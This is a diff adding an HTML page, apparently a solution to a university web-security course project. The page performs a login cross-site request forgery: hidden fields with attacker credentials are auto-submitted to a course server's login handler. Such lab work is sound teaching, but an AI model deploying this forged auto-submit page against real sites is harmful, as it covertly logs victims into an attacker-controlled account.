@@ -1,0 +1,20 @@
+<DOCTYPE HTML>
+<!--  Given by the project specification that 
+      Login handler accepts POST requests and takes plaintext
+      "username" and "password" query parameters. It checks if
+      a user with those credentials exists. 
+-->
+<head>
+  <meta charset="UTF-8">
+  <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
+</head>
+
+<body>
+  <form id="form" name="form" action="http://eecs388.org/project2/login" method="POST">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+  </form>
+<script>
+  document.form.submit();
+</script>
+</body>
